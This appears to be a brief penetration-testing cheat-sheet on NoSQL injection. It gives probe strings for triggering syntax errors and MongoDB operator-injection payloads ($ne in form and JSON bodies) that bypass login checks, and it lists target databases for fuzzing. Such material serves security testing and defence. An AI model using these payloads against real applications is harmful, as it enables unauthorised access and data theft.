This type of injection has two subtypes: arbitrary syntax injection and operator injection. Both of them may be able to run limited JavaScript in MongoDB, but data exfiltration methods and mitigations differ.

To probe syntax errors you can try to insert a valid special characters to vary the original request (notice the carriage returns!):
```
'"`{ 
;$Foo} 
$Foo \xYZ
```
Or try to insert restricted characters to cause an error:
```
%00
\u0000
null
system.FOO
```

### Injection context

In GET queries and `application/x-www-form-urlencoded` POST queries operator injection can look something like the following:
```
user[$ne]=fu&pass[$ne]=bar
```
In `application/json` POST requests NoSQL queries can be inserted directly:
```json
{"user": {"$ne": "foo"}, "pass": {"$ne": "invalid" }}
```

## Syntax injection
...

## Operator injection

In different databases operators can differ. There is provided a list of different NoSQL databases (build a fuzzing dictionary for yourself):
- MongoDB
- Couchbase
- CosmosDB
- Redis
- Amazon DynamoDB
- Apache Cassandra
- Apache HBase
- Neo4j
- Amazon Neptune
- [Yandex Clickhouse](https://blog.deteact.com/ru/yandex-clickhouse-injection/)(? discussable)

## Server Side JavaScript Injection (SSJI)
...

### See also
- [PHP execution via NSQLi](https://swarm.ptsecurity.com/rce-cockpit-cms/)